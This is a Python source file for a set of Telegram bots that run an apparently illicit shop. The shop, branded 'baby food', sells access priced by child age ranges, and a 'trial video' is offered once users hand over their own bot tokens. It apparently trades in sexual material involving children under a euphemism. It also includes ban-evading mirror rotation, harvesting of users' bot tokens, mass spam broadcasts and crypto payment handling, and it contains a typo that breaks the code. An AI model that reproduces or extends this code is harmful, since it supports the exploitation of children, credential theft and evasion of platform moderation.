# bot.py
# Полный код для хостинга (Bothost / любой другой)
# Токены загружаются из переменных окружения
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, InputMediaPhoto
import sqlite3
import time
import threading
import requests
import random
import string
from datetime import datetime
import os

# ========== ЗАГРУЗКА ТОКЕНОВ ИЗ ПЕРЕМЕННЫХ ОКРУЖЕНИЯ ==========
MAIN_BOT_TOKEN = os.getenv('MAIN_BOT_TOKEN')
WORKER_BOT_TOKEN = os.getenv('WORKER_BOT_TOKEN')
LOGGER_BOT_TOKEN = os.getenv('LOGGER_BOT_TOKEN')
ADMIN_ID = os.getenv('ADMIN_ID')
CRYPTOBOT_TOKEN = os.getenv('CRYPTOBOT_TOKEN')
DONATIONALERTS_NICK = os.getenv('DONATIONALERTS_NICK')

# Проверка обязательных переменных
if not all([MAIN_BOT_TOKEN, WORKER_BOT_TOKEN, LOGGER_BOT_TOKEN, ADMIN_ID]):
    raise ValueError("❌ Ошибка: не все переменные окружения заданы!")

# Каналы
MAIN_CHANNEL = "https://t.me/+S75wQGSxdBw2Mzhh"
REVIEWS_CHANNEL = "https://t.me/+Bb17ibvo_yMzZTAx"

# Фото товаров (замени на свои реальные file_id)
PHOTO_5_10 = "AgACAgIAAxkBAAIB"   # ЗАМЕНИТЬ
PHOTO_10_18 = "AgACAgIAAxkBAAIC"  # ЗАМЕНИТЬ

# Цены
PRICE_5_10 = 600      # 5-10 лет — 600₽
PRICE_10_18 = 450     # 10-18 лет — 450₽
USDT_RATE = 100       # 1 USDT = 100₽ (примерно)

# ========== БАЗА ДАННЫХ ==========
conn = sqlite3.connect('twin_bot.db', check_same_thread=False)
c = conn.cursor()

c.execute('''CREATE TABLE IF NOT EXISTS worker_bots 
             (token TEXT PRIMARY KEY, username TEXT, added_by TEXT, timestamp INTEGER, is_active INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS current_worker 
             (id INTEGER PRIMARY KEY, token TEXT, username TEXT, updated_at INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS user_balance 
             (user_id TEXT PRIMARY KEY, balance INTEGER, last_updated INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS payments 
             (user_id TEXT, amount INTEGER, payment_method TEXT, status TEXT, invoice_id TEXT, timestamp INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS user_sessions 
             (user_id TEXT, step TEXT, data TEXT, timestamp INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS user_stats 
             (user_id TEXT, purchases INTEGER, tokens_submitted INTEGER, last_active INTEGER, ref_code TEXT, earned INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS referals 
             (code TEXT PRIMARY KEY, owner_id TEXT, earnings INTEGER, clicks INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS all_users 
             (user_id TEXT PRIMARY KEY, first_seen INTEGER, last_seen INTEGER, channel_msg_id INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS user_logs 
             (user_id TEXT, action TEXT, details TEXT, timestamp INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS promo_codes 
             (code TEXT PRIMARY KEY, discount INTEGER, uses_left INTEGER, total_uses INTEGER, created_at INTEGER, is_active INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS user_promo_active 
             (user_id TEXT PRIMARY KEY, promo_code TEXT, discount INTEGER, expires_at INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS crypto_invoices 
             (invoice_id TEXT PRIMARY KEY, user_id TEXT, amount_usdt INTEGER, status TEXT, created_at INTEGER)''')
conn.commit()

# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
def log_to_logger(text):
    try:
        url = f"https://api.telegram.org/bot{LOGGER_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": ADMIN_ID, "text": text[:4000], "parse_mode": "HTML"}
        requests.post(url, json=payload, timeout=3)
    except:
        pass

def log_action(user_id, action, details=""):
    important = ["оплата", "ротация", "мёртв", "добавлен бот", "промокод", "создание бота", "пополнение"]
    if any(x in action.lower() for x in important):
        c.execute("INSERT INTO user_logs VALUES (?, ?, ?, ?)", (user_id, action, details, int(time.time())))
        conn.commit()
        log_to_logger(f"{action}: {details[:100]}")

def register_user(user_id):
    c.execute("SELECT * FROM all_users WHERE user_id=?", (user_id,))
    if not c.fetchone():
        c.execute("INSERT INTO all_users (user_id, first_seen, last_seen) VALUES (?, ?, ?)",
                  (user_id, int(time.time()), int(time.time())))
        c.execute("INSERT OR IGNORE INTO user_balance (user_id, balance, last_updated) VALUES (?, 0, ?)",
                  (user_id, int(time.time())))
    else:
        c.execute("UPDATE all_users SET last_seen=? WHERE user_id=?", (int(time.time()), user_id))
    conn.commit()

def get_balance(user_id):
    c.execute("SELECT balance FROM user_balance WHERE user_id=?", (user_id,))
    row = c.fetchone()
    return row[0] if row else 0

def update_balance(user_id, amount):
    c.execute("UPDATE user_balance SET balance = balance + ?, last_updated = ? WHERE user_id=?",
              (amount, int(time.time()), user_id))
    conn.commit()
    log_action(user_id, "изменение баланса", f"{'+' if amount > 0 else ''}{amount}")

# ========== РЕФЕРАЛЬНАЯ СИСТЕМА ==========
def generate_ref_code(user_id):
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    c.execute("INSERT OR REPLACE INTO user_stats (user_id, purchases, tokens_submitted, last_active, ref_code, earned) VALUES (?, 0, 0, ?, ?, 0)",
              (user_id, int(time.time()), code))
    c.execute("INSERT OR IGNORE INTO referals (code, owner_id, earnings, clicks) VALUES (?, ?, 0, 0)", (code, user_id))
    conn.commit()
    return code

def get_ref_link(user_id):
    c.execute("SELECT ref_code FROM user_stats WHERE user_id=?", (user_id,))
    row = c.fetchone()
    if not row or not row[0]:
        code = generate_ref_code(user_id)
    else:
        code = row[0]
    return f"https://t.me/{WORKER_BOT_TOKEN.split(':')[0]}?start=ref_{user_id}"

def add_ref_earnings(ref_code, amount):
    c.execute("SELECT owner_id FROM referals WHERE code=?", (ref_code,))
    row = c.fetchone()
    if row:
        owner = row[0]
        commission = int(amount * 0.4)
        c.execute("UPDATE referals SET earnings = earnings + ? WHERE code=?", (commission, ref_code))
        c.execute("UPDATE user_stats SET earned = earned + ? WHERE user_id=?", (commission, owner))
        conn.commit()
        log_action(owner, "комиссия с реферала", f"{commission}₽")

# ========== ПРОМОКОДЫ ==========
def create_promo_code(code, discount, uses_left):
    c.execute("INSERT OR REPLACE INTO promo_codes VALUES (?, ?, ?, ?, ?, 1)",
              (code, discount, uses_left, 0, int(time.time()), 1))
    conn.commit()

def get_all_promos():
    c.execute("SELECT code, discount, uses_left FROM promo_codes WHERE is_active=1 AND uses_left>0")
    return c.fetchall()

def apply_promo_code(user_id, code):
    c.execute("SELECT discount, uses_left FROM promo_codes WHERE code=? AND is_active=1 AND uses_left>0", (code,))
    row = c.fetchone()
    if not row:
        return False, 0
    discount, uses_left = row
    c.execute("INSERT OR REPLACE INTO user_promo_active (user_id, promo_code, discount, expires_at) VALUES (?, ?, ?, ?)",
              (user_id, code, discount, int(time.time()) + 3600))
    c.execute("UPDATE promo_codes SET uses_left = uses_left - 1 WHERE code=?", (code,))
    conn.commit()
    log_action(user_id, "активирован промокод", f"{code} - {discount}%")
    return True, discount

def get_user_promo(user_id):
    c.execute("SELECT promo_code, discount FROM user_promo_active WHERE user_id=? AND expires_at > ?", (user_id, int(time.time())))
    row = c.fetchone()
    return row if row else (None, 0)

# ========== КРИПТОБОТ (AUTO PAY) ==========
def create_crypto_invoice(amount_usdt, user_id):
    if not CRYPTOBOT_TOKEN:
        return None, None
    try:
        url = "https://api.crypt.bot/v1/createInvoice"
        headers = {"Crypto-Pay-API-Token": CRYPTOBOT_TOKEN}
        data = {"asset": "USDT", "amount": str(amount_usdt)}
        r = requests.post(url, headers=headers, json=data, timeout=10)
        result = r.json()
        if result.get('ok'):
            invoice_id = result['result']['invoice_id']
            pay_url = result['result']['pay_url']
            c.execute("INSERT INTO crypto_invoices VALUES (?, ?, ?, ?, ?)",
                      (str(invoice_id), user_id, amount_usdt, "active", int(time.time())))
            conn.commit()
            return invoice_id, pay_url
        return None, None
    except Exception as e:
        log_action("system", "ошибка криптобота", str(e)[:100])
        return None, None

def check_crypto_invoices():
    if not CRYPTOBOT_TOKEN:
        return
    while True:
        try:
            c.execute("SELECT invoice_id, user_id, amount_usdt FROM crypto_invoices WHERE status='active'")
            invoices = c.fetchall()
            url = "https://api.crypt.bot/v1/getInvoices"
            headers = {"Crypto-Pay-API-Token": CRYPTOBOT_TOKEN}
            for invoice_id, user_id, amount_usdt in invoices:
                params = {"invoice_ids": invoice_id}
                r = requests.get(url, headers=headers, params=params, timeout=10)
                data = r.json()
                if data.get('ok') and data['result']['items']:
                    status = data['result']['items'][0]['status']
                    if status == 'paid':
                        c.execute("UPDATE crypto_invoices SET status='paid' WHERE invoice_id=?", (invoice_id,))
                        # Начисляем баланс в рублях (amount_usdt * 100)
                        rub_amount = amount_usdt * USDT_RATE
                        update_balance(user_id, rub_amount)
                        log_action(user_id, "пополнение через криптобот", f"{rub_amount}₽ ({amount_usdt} USDT)")
                        conn.commit()
            time.sleep(10)
        except Exception as e:
            time.sleep(30)

# ========== СИСТЕМА ЗЕРКАЛ ==========
def get_current_worker():
    c.execute("SELECT token, username FROM current_worker WHERE id=1")
    row = c.fetchone()
    if row:
        return row[0], row[1]
    set_current_worker(WORKER_BOT_TOKEN, "worker_bot")
    return WORKER_BOT_TOKEN, "worker_bot"

def set_current_worker(token, username):
    c.execute("DELETE FROM current_worker WHERE id=1")
    c.execute("INSERT INTO current_worker VALUES (1, ?, ?, ?)", (token, username, int(time.time())))
    conn.commit()

def check_bot_alive(token):
    try:
        r = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=5)
        if r.json().get('ok'):
            return True, r.json()['result']['username']
        return False, None
    except:
        return False, None

def add_mirror_bot(token, username, added_by):
    c.execute("INSERT OR REPLACE INTO worker_bots VALUES (?, ?, ?, ?, 1)", (token, username, added_by, int(time.time())))
    conn.commit()
    log_action(added_by, "добавлено зеркало", f"бот: @{username}")

def get_all_mirrors():
    c.execute("SELECT token, username FROM worker_bots WHERE is_active=1 ORDER BY timestamp DESC")
    return c.fetchall()

def rotate_worker():
    token, name = get_current_worker()
    alive, _ = check_bot_alive(token)
    if not alive:
        log_action("system", "бот мёртв", f"бот: @{name}")
        for t, u in get_all_mirrors():
            if t != token and check_bot_alive(t)[0]:
                set_current_worker(t, u)
                log_action("system", "ротация", f"новый бот: @{u}")
                return True
        set_current_worker(WORKER_BOT_TOKEN, "worker_bot_default")
        log_action("system", "нет живых ботов", "использую резервный")
    return True

def monitor_worker():
    while True:
        try:
            rotate_worker()
        except:
            pass
        time.sleep(600)

# ========== БОТ-ЛОГГЕР (АДМИНКА) ==========
logger_bot = telebot.TeleBot(LOGGER_BOT_TOKEN)

def admin_kb():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("📊 статистика", callback_data="stats"),
        InlineKeyboardButton("🤖 зеркала", callback_data="mirrors"),
        InlineKeyboardButton("📜 логи", callback_data="logs"),
        InlineKeyboardButton("📢 рассылка", callback_data="spam"),
        InlineKeyboardButton("➕ добавить зеркало", callback_data="add_mirror"),
        InlineKeyboardButton("📈 рефералы", callback_data="refs"),
        InlineKeyboardButton("🎟 промокоды", callback_data="promos"),
        InlineKeyboardButton("💰 платежи", callback_data="payments")
    )
    return kb

@logger_bot.message_handler(commands=['start', 'admin'])
def admin_start(m):
    if str(m.from_user.id) != ADMIN_ID:
        logger_bot.reply_to(m, "❌ доступ запрещён")
        return
    logger_bot.send_message(m.chat.id, "🔐 <b>АДМИН ПАНЕЛЬ</b>", parse_mode='HTML', reply_markup=admin_kb())

@logger_bot.callback_query_handler(func=lambda call: True)
def admin_cb(call):
    if str(call.from_user.id) != ADMIN_ID:
        logger_bot.answer_callback_query(call.id, "доступ запрещён")
        return
    
    if call.data == "stats":
        c.execute("SELECT COUNT(*) FROM all_users")
        users = c.fetchone()[0]
        c.execute("SELECT SUM(balance) FROM user_balance")
        total_balance = c.fetchone()[0] or 0
        c.execute("SELECT COUNT(*) FROM worker_bots WHERE is_active=1")
        mirrors = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM payments WHERE status='completed'")
        payments = c.fetchone()[0]
        text = f"📊 статистика\n\n👥 пользователей: {users}\n💰 баланс юзеров: {total_balance}₽\n🪞 зеркал: {mirrors}\n💳 оплат: {payments}"
        logger_bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=admin_kb())
    
    elif call.data == "mirrors":
        mirrors = get_all_mirrors()
        if not mirrors:
            text = "🤖 зеркала\n\nнет зеркал"
        else:
            text = "🤖 зеркала\n\n"
            for t, u in mirrors[:15]:
                alive, _ = check_bot_alive(t)
                text += f"▫️ @{u} — {'✅ жив' if alive else '❌ мёртв'}\n"
        logger_bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=admin_kb())
    
    elif call.data == "logs":
        c.execute("SELECT action, details, timestamp FROM user_logs ORDER BY timestamp DESC LIMIT 20")
        logs = c.fetchall()
        if not logs:
            text = "📜 логи\n\nнет логов"
        else:
            text = "📜 логи\n\n"
            for action, details, ts in logs:
                dt = datetime.fromtimestamp(ts).strftime("%H:%M %d.%m")
                text += f"[{dt}] {action}: {details[:50]}\n"
        logger_bot.edit_message_text(text[:4000], call.message.chat.id, call.message.message_id, reply_markup=admin_kb())
    
    elif call.data == "spam":
        c.execute("DELETE FROM user_sessions WHERE user_id=?", (ADMIN_ID,))
        c.execute("INSERT INTO user_sessions VALUES (?, ?, ?, ?)", (ADMIN_ID, "spam_mode", "", int(time.time())))
        conn.commit()
        logger_bot.send_message(call.message.chat.id, "📢 отправь текст или фото для рассылки:")
        logger_bot.delete_message(call.message.chat.id, call.message.message_id)
    
    elif call.data == "add_mirror":
        c.execute("DELETE FROM user_sessions WHERE user_id=?", (ADMIN_ID,))
        c.execute("INSERT INTO user_sessions VALUES (?, ?, ?, ?)", (ADMIN_ID, "add_mirror_mode", "", int(time.time())))
        conn.commit()
        logger_bot.send_message(call.message.chat.id, "➕ отправь токен бота-зеркала в формате:\n`1234567890:ABCdef...`", parse_mode='Markdown')
        logger_bot.delete_message(call.message.chat.id, call.message.message_id)
    
    elif call.data == "refs":
        c.execute("SELECT code, owner_id, earnings, clicks FROM referals ORDER BY earnings DESC LIMIT 10")
        refs = c.fetchall()
        if not refs:
            text = "📈 топ рефералов\n\nнет рефералов"
        else:
            text = "📈 топ рефералов\n\n"
            for code, owner, earn, clicks in refs[:10]:
                text += f"▫️ {code} — {earn}₽ ({clicks} кликов)\n"
        logger_bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=admin_kb())
    
    elif call.data == "promos":
        promos = get_all_promos()
        if not promos:
            text = "🎟 промокоды\n\nнет промокодов"
        else:
            text = "🎟 промокоды\n\n"
            for code, discount, left in promos:
                text += f"▫️ {code} — {discount}% (осталось: {left})\n"
        logger_bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=admin_kb())
    
    elif call.data == "payments":
        c.execute("SELECT user_id, amount, payment_method, status, timestamp FROM payments ORDER BY timestamp DESC LIMIT 20")
        pays = c.fetchall()
        if not pays:
            text = "💰 платежи\n\nнет платежей"
        else:
            text = "💰 платежи\n\n"
            for uid, amt, method, status, ts in pays:
                dt = datetime.fromtimestamp(ts).strftime("%H:%M %d.%m")
                status_emoji = "✅" if status == "completed" else "⏳"
                text += f"{status_emoji} [{dt}] {uid}: {amt}₽ ({method})\n"
        logger_bot.edit_message_text(text[:4000], call.message.chat.id, call.message.message_id, reply_markup=admin_kb())

@logger_bot.message_handler(func=lambda m: True, content_types=['text', 'photo'])
def admin_text(m):
    if str(m.from_user.id) != ADMIN_ID:
        return
    c.execute("SELECT step FROM user_sessions WHERE user_id=?", (ADMIN_ID,))
    row = c.fetchone()
    if not row:
        return
    step = row[0]
    
    if step == "spam_mode":
        c.execute("SELECT user_id FROM all_users")
        users = c.fetchall()
        sent = 0
        failed = 0
        for (uid,) in users:
            try:
                if m.content_type == 'text':
                    logger_bot.send_message(uid, m.text, parse_mode='HTML')
                elif m.content_type == 'photo':
                    photo = m.photo[-1].file_id
                    caption = m.caption if m.caption else ""
                    logger_bot.send_photo(uid, photo, caption=caption, parse_mode='HTML')
                sent += 1
                time.sleep(0.05)
            except:
                failed += 1
        logger_bot.reply_to(m, f"✅ рассылка\n📨 отправлено: {sent}\n❌ ошибок: {failed}")
        c.execute("DELETE FROM user_sessions WHERE user_id=?", (ADMIN_ID,))
        conn.commit()
    
    elif step == "add_mirror_mode":
        token = m.text.strip()
        if ':' not in token:
            logger_bot.reply_to(m, "❌ неверный формат токена")
            return
        alive, username = check_bot_alive(token)
        if not alive:
            logger_bot.reply_to(m, "❌ бот не существует или заблокирован")
            return
        add_mirror_bot(token, username, ADMIN_ID)
        logger_bot.reply_to(m, f"✅ зеркало @{username} добавлено")
        c.execute("DELETE FROM user_sessions WHERE user_id=?", (ADMIN_ID,))
        conn.commit()

# ========== ОСНОВНОЙ БОТ (ПЕРЕХОДНИК) ==========
main_bot = telebot.TeleBot(MAIN_BOT_TOKEN)

@main_bot.message_handler(commands=['start'])
def main_start(m):
    user_id = str(m.from_user.id)
    register_user(user_id)
    token, username = get_current_worker()
    alive, real_username = check_bot_alive(token)
    if not alive:
        rotate_worker()
        token, username = get_current_worker()
        alive, real_username = check_bot_alive(token)
    if alive and real_username:
        username = real_username
    text = f"🤖 актуальный бот\n\n@{username}\n\n👇 нажми на username выше"
    main_bot.reply_to(m, text)

# ========== РАБОЧИЙ БОТ (ПРОДАЖИ, КАЗИНО, ПРОФИЛЬ) ==========
worker_bot = telebot.TeleBot(WORKER_BOT_TOKEN)

def worker_menu():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("🛒 магазин", callback_data="shop"),
        InlineKeyboardButton("🎰 казино", callback_data="casino"),
        InlineKeyboardButton("⭐ отзывы", callback_data="reviews"),
        InlineKeyboardButton("📈 рефералка", callback_data="referral"),
        InlineKeyboardButton("🎟 промокод", callback_data="promo"),
        InKeyboardButton("🤖 пробное видео", callback_data="trial"),
        InlineKeyboardButton("👤 профиль", callback_data="profile")
    )
    return kb

def send_pinned_channel_message(chat_id, user_id):
    # Проверяем, отправляли ли уже закреплённое сообщение
    c.execute("SELECT channel_msg_id FROM all_users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    if row and row[0]:
        return  # уже отправляли
    
    text = "📢 <b>ПОДПИШИСЬ НА НАШ КАНАЛ</b>\n\nВ канале мы публикуем:\n▪️ Промокоды на скидку\n▪️ Анонсы новых товаров\n▪️ Розыгрыши\n\n👇 ПОДПИСАТЬСЯ"
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("📢 ПОДПИСАТЬСЯ", url=MAIN_CHANNEL))
    try:
        sent = worker_bot.send_message(chat_id, text, parse_mode='HTML', reply_markup=kb)
        worker_bot.pin_chat_message(chat_id, sent.message_id)
        c.execute("UPDATE all_users SET channel_msg_id=? WHERE user_id=?", (sent.message_id, user_id))
        conn.commit()
    except:
        pass

@worker_bot.message_handler(commands=['start'])
def worker_start(m):
    user_id = str(m.from_user.id)
    ref_code = None
    if ' ' in m.text:
        parts = m.text.split()
        if len(parts) > 1:
            ref_code = parts[1].replace('ref_', '')
    
    register_user(user_id)
    
    if ref_code and ref_code != user_id:
        add_ref_earnings(ref_code, 0)
    
    # Реферальная ссылка
    get_ref_link(user_id)
    
    # Отправляем закреплённое сообщение с каналом
    send_pinned_channel_message(m.chat.id, user_id)
    
    # Приветственное меню
    text = "🍼 <b>ДЕТСКОЕ ПИТАНИЕ SHOP</b>\n\nвыбери действие в меню ниже:"
    worker_bot.send_message(m.chat.id, text, parse_mode='HTML', reply_markup=worker_menu())

@worker_bot.callback_query_handler(func=lambda call: True)
def worker_cb(call):
    user_id = str(call.from_user.id)
    
    # МАГАЗИН
    if call.data == "shop":
        kb = InlineKeyboardMarkup(row_width=1)
        kb.add(
            InlineKeyboardButton("👶 5-10 лет — 600₽", callback_data="buy_5_10"),
            InlineKeyboardButton("🧒 10-18 лет — 450₽", callback_data="buy_10_18"),
            InlineKeyboardButton("🔙 назад", callback_data="back")
        )
        worker_bot.edit_message_text("📦 <b>выбери категорию:</b>", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=kb)
    
    elif call.data == "buy_5_10":
        promo, discount = get_user_promo(user_id)
        price = PRICE_5_10
        if discount > 0:
            price = int(price * (100 - discount) / 100)
            caption = f"👶 5-10 лет\n\n✨ промокод: -{discount}%\n💰 цена: {price}₽\n\n💳 после оплаты доступ откроется"
        else:
            caption = f"👶 5-10 лет\n\n💰 цена: {price}₽\n\n💳 после оплаты доступ откроется"
        
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("💳 CRYPTOBOT (авто)", callback_data=f"pay_crypto_{price}_5_10"))
        if DONATIONALERTS_NICK:
            kb.add(InlineKeyboardButton("💳 DONATIONALERTS (скриншот)", callback_data="pay_donationalerts"))
        kb.add(InlineKeyboardButton("🔙 назад", callback_data="shop"))
        
        try:
            worker_bot.edit_message_media(
                InputMediaPhoto(PHOTO_5_10, caption=caption, parse_mode='HTML'),
                call.message.chat.id, call.message.message_id, reply_markup=kb
            )
        except:
            worker_bot.edit_message_text(caption, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=kb)
    
    elif call.data == "buy_10_18":
        promo, discount = get_user_promo(user_id)
        price = PRICE_10_18
        if discount > 0:
            price = int(price * (100 - discount) / 100)
            caption = f"🧒 10-18 лет\n\n✨ промокод: -{discount}%\n💰 цена: {price}₽\n\n💳 после оплаты доступ откроется"
        else:
            caption = f"🧒 10-18 лет\n\n💰 цена: {price}₽\n\n💳 после оплаты доступ откроется"
        
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("💳 CRYPTOBOT (авто)", callback_data=f"pay_crypto_{price}_10_18"))
        if DONATIONALERTS_NICK:
            kb.add(InlineKeyboardButton("💳 DONATIONALERTS (скриншот)", callback_data="pay_donationalerts"))
        kb.add(InlineKeyboardButton("🔙 назад", callback_data="shop"))
        
        try:
            worker_bot.edit_message_media(
                InputMediaPhoto(PHOTO_10_18, caption=caption, parse_mode='HTML'),
                call.message.chat.id, call.message.message_id, reply_markup=kb
            )
        except:
            worker_bot.edit_message_text(caption, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=kb)
    
    # ОПЛАТА ЧЕРЕЗ CRYPTOBOT
    elif call.data.startswith("pay_crypto_"):
        parts = call.data.split("_")
        price = int(parts[2])
        product = "_".join(parts[3:])
        amount_usdt = max(1, price // USDT_RATE)
        
        invoice_id, pay_url = create_crypto_invoice(amount_usdt, user_id)
        if pay_url:
            # Сохраняем платёж в БД
            c.execute("INSERT INTO payments (user_id, amount, payment_method, status, invoice_id, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
                      (user_id, price, "cryptobot", "pending", invoice_id, int(time.time())))
            conn.commit()
            
            kb = InlineKeyboardMarkup()
            kb.add(InlineKeyboardButton("💳 ОПЛАТИТЬ", url=pay_url))
            kb.add(InlineKeyboardButton("🔄 проверить оплату", callback_data=f"check_pay_{invoice_id}_{price}_{product}"))
            kb.add(InlineKeyboardButton("🔙 назад", callback_data="shop"))
            
            text = f"🤖 <b>ОПЛАТА ЧЕРЕЗ CRYPTOBOT</b>\n\n💰 сумма: {price}₽ ({amount_usdt} USDT)\n\n1️⃣ нажми «ОПЛАТИТЬ»\n2️⃣ открой счёт в USDT\n3️⃣ оплати переводом\n\n✅ после оплаты баланс зачислится автоматически\n\n📺 <a href='https://youtu.be/l5qt_5l0DfI'>видеоинструкция</a>"
            worker_bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=kb)
        else:
            worker_bot.answer_callback_query(call.id, "❌ ошибка создания счёта, попробуй позже")
    
    # ПРОВЕРКА ОПЛАТЫ CRYPTOBOT
    elif call.data.startswith("check_pay_"):
        parts = call.data.split("_")
        invoice_id = parts[3]
        price = int(parts[4])
        product = "_".join(parts[5:])
        
        c.execute("SELECT status FROM crypto_invoices WHERE invoice_id=?", (invoice_id,))
        row = c.fetchone()
        if row and row[0] == 'paid':
            # Выдаём доступ
            worker_bot.send_message(call.message.chat.id, f"✅ ОПЛАТА ПОДТВЕРЖДЕНА! Доступ к товару {product} открыт.")
            c.execute("UPDATE payments SET status='completed' WHERE invoice_id=?", (invoice_id,))
            conn.commit()
            log_action(user_id, "успешная оплата", f"{price}₽ через криптобот ({product})")
            worker_bot.delete_message(call.message.chat.id, call.message.message_id)
        else:
            worker_bot.answer_callback_query(call.id, "⏳ оплата ещё не получена, подожди 1-2 минуты", show_alert=True)
    
    # ОПЛАТА ЧЕРЕЗ DONATIONALERTS (ручная проверка)
    elif call.data == "pay_donationalerts":
        url = f"https://www.donationalerts.com/r/{DONATIONALERTS_NICK}"
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("💳 ПЕРЕЙТИ К ОПЛАТЕ", url=url))
        kb.add(InlineKeyboardButton("📸 ОТПРАВИТЬ СКРИНШОТ", callback_data="send_screenshot"))
        kb.add(InlineKeyboardButton("🔙 назад", callback_data="shop"))
        text = f"💳 <b>ОПЛАТА ЧЕРЕЗ DONATIONALERTS</b>\n\n1️⃣ перейди по ссылке\n2️⃣ укажи сумму и сообщение с названием товара\n3️⃣ оплати картой\n4️⃣ отправь скриншот чека\n\nадмин проверит и выдаст доступ вручную"
        worker_bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=kb)
    
    elif call.data == "send_screenshot":
        worker_bot.send_message(call.message.chat.id, "📸 отправь скриншот чека об оплате (можно фото)")
        c.execute("INSERT OR REPLACE INTO user_sessions VALUES (?, ?, ?, ?)", (user_id, "awaiting_screenshot", "", int(time.time())))
        conn.commit()
        worker_bot.delete_message(call.message.chat.id, call.message.message_id)
    
    # ОТЗЫВЫ
    elif call.data == "reviews":
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("⭐ канал с отзывами", url=REVIEWS_CHANNEL))
        kb.add(InlineKeyboardButton("🔙 назад", callback_data="back"))
        worker_bot.edit_message_text("⭐ отзывы наших клиентов", call.message.chat.id, call.message.message_id, reply_markup=kb)
    
    # РЕФЕРАЛКА
    elif call.data == "referral":
        ref_link = get_ref_link(user_id)
        c.execute("SELECT earned FROM user_stats WHERE user_id=?", (user_id,))
        row = c.fetchone()
        earned = row[0] if row else 0
        c.execute("SELECT COUNT(*) FROM referals WHERE code IN (SELECT ref_code FROM user_stats WHERE user_id=?)")
        # проще отдельным запросом
        c.execute("SELECT clicks FROM referals WHERE owner_id=?", (user_id,))
        ref_row = c.fetchone()
        clicks = ref_row[0] if ref_row else 0
        
        text = f"📈 <b>ТВОЯ РЕФЕРАЛЬНАЯ ССЫЛКА</b>\n\n<code>{ref_link}</code>\n\n💰 заработано: {earned}₽\n👥 перешло: {clicks}\n🎁 40% с пополнений твоих рефералов"
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("🔙 назад", callback_data="back"))
        worker_bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=kb)
    
    # ПРОМОКОД
    elif call.data == "promo":
        worker_bot.send_message(call.message.chat.id, "🎟 введи промокод:")
        c.execute("INSERT OR REPLACE INTO user_sessions VALUES (?, ?, ?, ?)", (user_id, "awaiting_promo", "", int(time.time())))
        conn.commit()
        worker_bot.delete_message(call.message.chat.id, call.message.message_id)
    
    # ПРОБНОЕ ВИДЕО (создать бота → доступ)
    elif call.data == "trial":
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("🤖 создать бота", url="https://t.me/botfather"))
        kb.add(InlineKeyboardButton("📤 отправить токен", callback_data="send_trial_token"))
        kb.add(InlineKeyboardButton("🔙 назад", callback_data="back"))
        worker_bot.edit_message_text(
            "🎬 <b>ПРОБНОЕ ВИДЕО</b>\n\n1️⃣ создай бота в @BotFather\n2️⃣ отправь его токен сюда\n3️⃣ получи доступ к пробному видео\n\n🤝 бот попадёт в нашу базу зеркал и поможет сервису жить дольше",
            call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=kb
        )
    
    elif call.data == "send_trial_token":
        worker_bot.send_message(call.message.chat.id, "📝 отправь токен своего бота:\n`1234567890:ABCdef...`", parse_mode='Markdown')
        c.execute("INSERT OR REPLACE INTO user_sessions VALUES (?, ?, ?, ?)", (user_id, "awaiting_trial_token", "", int(time.time())))
        conn.commit()
        worker_bot.delete_message(call.message.chat.id, call.message.message_id)
    
    # ПРОФИЛЬ
    elif call.data == "profile":
        balance = get_balance(user_id)
        c.execute("SELECT earned, ref_code FROM user_stats WHERE user_id=?", (user_id,))
        row = c.fetchone()
        earned = row[0] if row else 0
        c.execute("SELECT clicks FROM referals WHERE owner_id=?", (user_id,))
        ref_row = c.fetchone()
        clicks = ref_row[0] if ref_row else 0
        ref_link = get_ref_link(user_id)
        
        text = f"👤 <b>ТВОЙ ПРОФИЛЬ</b>\n\n🆔 ID: {user_id}\n💰 баланс (казино): {balance}₽\n👥 рефералов: {clicks}\n💸 заработано: {earned}₽\n\n📎 рефералка:\n<code>{ref_link}</code>"
        kb = InlineKeyboardMarkup(row_width=1)
        kb.add(
            InlineKeyboardButton("💰 ПОПОЛНИТЬ БАЛАНС", callback_data="deposit"),
            InlineKeyboardButton("🔙 НАЗАД", callback_data="back")
        )
        worker_bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=kb)
    
